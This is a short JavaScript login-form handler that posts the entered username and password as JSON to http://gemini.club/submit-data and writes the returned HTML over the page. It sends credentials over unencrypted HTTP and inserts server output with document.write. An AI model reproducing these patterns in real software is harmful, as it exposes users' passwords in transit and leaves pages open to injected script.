const username_input = document.querySelector("#username")
const password_input = document.querySelector("#password")

const button = document.querySelector("button")


button.addEventListener("click",(event)=>{
    event.preventDefault()
    formData = {
        username : username_input.value,
        password : password_input.value
    }

  sendRequest(formData)
    
})

async function sendRequest(formData){

    try{
        const response = await fetch('http://gemini.club/submit-data',{
            method:'POST',
            headers:{
                'Content-Type':'application/json'
            },
            body:JSON.stringify(formData)
        })
    
        if (!response.ok){
            throw new Error('Network response was not ok ' + response.statusText)
        }
    
        html = await response.text()

        document.open()
        document.write(html)
        document.close()
        
        // document.getElementById('content').innerHTML = html
        
    }
    catch (error){
        console.error('Error:', error)
        alert('There was a problem with your submission.')
    }
}